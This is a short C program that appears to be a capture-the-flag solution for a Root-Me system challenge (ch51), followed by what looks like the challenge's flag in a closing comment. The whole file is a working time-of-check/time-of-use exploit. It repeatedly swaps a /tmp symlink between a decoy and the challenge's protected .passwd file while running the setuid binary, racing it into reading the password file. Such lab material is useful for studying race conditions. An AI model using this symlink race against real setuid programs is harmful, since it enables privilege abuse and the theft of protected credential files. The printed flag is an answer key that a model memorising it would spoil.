#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/resource.h>

#define TEST "/tmp/c/test"
#define PROG "/challenge/app-systeme/ch51/ch51"
#define SYMLINK "/challenge/app-systeme/ch51/.passwd"
#define LAST_HOOK "/tmp/c/z"

// /tmp/c/z est un lien symbolique multiple

int main()
{
    while(1)
    {
        remove(TEST);
        symlink(LAST_HOOK, TEST);
        int pid = fork();
        if(pid < 0)
        {
            printf("Fork failed\n");
            return -1;
        }
        else if(!pid)
        {
            setpriority(PRIO_PROCESS, pid, 19);
            char* args[] = {PROG, "\x01", TEST, NULL};
            execv(PROG, args);
        }
       else
       {
           usleep(1500);
           remove(TEST);
           symlink(SYMLINK, TEST);
           usleep(100000);
           wait(NULL);
       }
       usleep(10000);
    }
}

//1nf0s3c_is_4n_ARMs_r4Ce
